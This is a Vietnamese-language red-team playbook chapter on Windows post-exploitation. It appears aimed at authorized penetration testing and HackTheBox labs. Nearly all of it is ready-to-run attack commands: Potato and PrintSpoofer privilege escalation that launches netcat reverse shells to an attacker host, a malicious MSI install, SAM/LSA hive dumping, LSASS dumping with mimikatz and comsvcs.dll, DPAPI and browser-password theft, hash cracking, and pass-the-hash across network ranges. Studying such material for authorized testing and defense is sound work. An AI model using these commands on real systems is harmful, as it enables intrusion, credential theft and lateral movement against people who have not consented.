# 06 — Local admin: privesc nhanh & dump credential

Khi đã có shell trên một máy Windows nhưng **chưa phải admin/SYSTEM**, hoặc vừa
thành admin và muốn **lấy thêm credential** để đi tiếp. Mỗi credential mới →
quay lại [file 03](03-co-credential-enum.md).

---

## 1. Định hướng (orientation) sau khi có shell

```powershell
PS> whoami /all           # user, nhóm, PRIVILEGE (SeImpersonate? SeBackup? SeDebug?)
PS> whoami /priv
PS> hostname ; systeminfo  # bản vá, OS
PS> ipconfig /all ; route print ; arp -a    # mạng (pivot!)
PS> net user ; net localgroup administrators
PS> net user /domain ; net group "Domain Admins" /domain
PS> cmdkey /list          # credential đã lưu → runas /savecred
PS> Get-Process           # EDR/AV đang chạy?
```

**Privilege quan trọng:**
- `SeImpersonatePrivilege` → Potato → SYSTEM (mục 2). *Dịch vụ web/MSSQL luôn có.*
- `SeBackupPrivilege` / `SeRestorePrivilege` → đọc file bất kỳ (SAM, NTDS.dit).
- `SeDebugPrivilege` → dump LSASS.
- `SeLoadDriverPrivilege`, `SeTakeOwnershipPrivilege` → privesc chuyên biệt.

---

## 2. SeImpersonate → SYSTEM (Potato)

**Giải thích:** Tài khoản service có `SeImpersonatePrivilege` có thể mạo danh
token của client kết nối tới nó. Các "Potato" ép một tiến trình SYSTEM xác thực
tới một named pipe/RPC do ta kiểm soát, rồi mạo danh token SYSTEM đó.

```powershell
# GodPotato (hoạt động rộng Win Server 2012R2–2022)
PS> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
PS> .\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe LHOST 443 -e cmd"
# PrintSpoofer (cần Print Spooler)
PS> .\PrintSpoofer64.exe -i -c cmd
PS> .\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe LHOST 443 -e cmd"
# SweetPotato / JuicyPotatoNG — phương án dự phòng
```

**Lab:** HTB *Querier*, *Escape*, *Jeeves*; gần như mọi foothold qua MSSQL/IIS/web.

---

## 3. Privesc local "truyền thống" (chạy khi không có SeImpersonate)

```powershell
# Tự động
PS> .\winPEASx64.exe quiet
PS> .\PrivescCheck.ps1 ; Invoke-PrivescCheck -Extended
PS> .\Seatbelt.exe -group=all
```

```bash
# Từ Kali (nhanh) — nếu có WinRM/credential, dùng nxc/winpeas tải về
```

Các hướng winPEAS/PrivescCheck hay chỉ ra:
- **Unquoted service path** / **service có quyền ghi binary** / **weak service perms**
  (`sc qc`, `accesschk`) → thay binary → restart service.
- **AlwaysInstallElevated** (`reg query HKLM\...\Installer /v AlwaysInstallElevated`)
  → `msfvenom -f msi` → `msiexec /quiet /i evil.msi`.
- **Autologon credential** trong registry (`winlogon` DefaultPassword).
- **Scheduled task** chạy script ghi được.
- **DLL hijacking**, **PATH ghi được**.
- **Credential trong file**: `web.config`, `unattend.xml`, `*.kdbx`, lịch sử
  PowerShell (`Get-History`, `ConsoleHost_history.txt`), `cmdkey /list` + `runas /savecred`.

```powershell
# Lịch sử PowerShell — hay chứa mật khẩu
PS> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Tìm file cấu hình
PS> findstr /spin "password" C:\*.config C:\*.xml C:\*.ini 2>nul
```

> Phần privesc local Windows nằm ngoài phạm vi tài liệu AD này; dùng winPEAS +
> HackTricks "Windows Local Privilege Escalation" làm tham chiếu đầy đủ.

---

## 4. Dump credential khi đã là admin/SYSTEM

### 4.1. SAM + LSA secrets (credential LOCAL của máy)

**Giải thích:** `SAM` chứa hash user **local**; `LSA secrets` chứa mật khẩu
service account, autologon, cached... Hash local Administrator thường dùng lại
trên nhiều máy → PtH.

```bash
# Từ xa (cần admin)
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET
impacket-secretsdump -hashes :$HASH $DOMAIN/$USER@$TARGET
nxc smb $TARGET -u $USER -p $PASS --sam --lsa
nxc smb $TARGET -u Administrator -H $HASH --local-auth --sam
```

```powershell
# Trên máy (lưu hive rồi secretsdump offline — tránh chạm LSASS)
PS> reg save HKLM\SAM  C:\Users\Public\sam.save
PS> reg save HKLM\SYSTEM C:\Users\Public\system.save
PS> reg save HKLM\SECURITY C:\Users\Public\security.save
# tải về Kali:
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### 4.2. LSASS (credential của user đang/đã đăng nhập — mật khẩu, hash, ticket)

```powershell
# mimikatz
PS> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::ekeys          # khóa Kerberos (AES)
mimikatz # sekurlsa::tickets /export
# Dump an toàn hơn (né AV): tạo minidump rồi phân tích offline
PS> rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID_lsass> C:\Users\Public\lsass.dmp full
```

```bash
# Phân tích dump offline trên Kali (pypykatz — không cần mimikatz trên máy nạn nhân)
pypykatz lsa minidump lsass.dmp
# Từ xa
nxc smb $TARGET -u $USER -p $PASS -M lsassy
nxc smb $TARGET -u $USER -p $PASS --lsa
```

### 4.3. DPAPI (mật khẩu trình duyệt, Wi-Fi, credential manager, RDP)

```bash
nxc smb $TARGET -u $USER -p $PASS --dpapi            # NetExec tự lấy masterkey + giải mã
impacket-dpapi ...
```

```powershell
PS> mimikatz # dpapi::cred /in:C:\Users\u\AppData\...\Credentials\<file>
PS> .\SharpDPAPI.exe triage          # quét toàn bộ
PS> .\SharpChrome.exe logins
```

### 4.4. Cached domain credentials (DCC2 / mscash)

Khi DC không sẵn sàng, Windows lưu hash domain user từng đăng nhập (dạng DCC2 —
**không PtH được**, chỉ crack offline).

```bash
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET      # phần "Dumping cached domain logon"
hashcat -m 2100 '$DCC2$10240#user#hash' rockyou.txt
```

---

## 5. Sau khi dump — khai thác tiếp

- NT hash local Administrator → PtH sang máy khác (`nxc smb <range> -u Administrator -H <hash> --local-auth`).
- Mật khẩu/hash domain user mới → quay lại [file 03](03-co-credential-enum.md) + BloodHound.
- Ticket Kerberos trong LSASS → Pass-the-Ticket ([file 07](07-lateral-movement-pivoting.md)).
- Credential `krbtgt` chỉ lấy được qua DCSync/NTDS.dit trên DC ([file 08](08-domain-admin-persistence.md)).

## Checklist

- [ ] `whoami /priv` — SeImpersonate / SeBackup / SeDebug?
- [ ] SeImpersonate → GodPotato/PrintSpoofer → SYSTEM
- [ ] winPEAS/PrivescCheck nếu không có privilege đặc biệt
- [ ] Admin → `--sam --lsa`, LSASS (pypykatz), DPAPI, DCC2
- [ ] File cấu hình, lịch sử PowerShell, cmdkey
- [ ] Mọi credential mới → file 03 + PtH khắp mạng
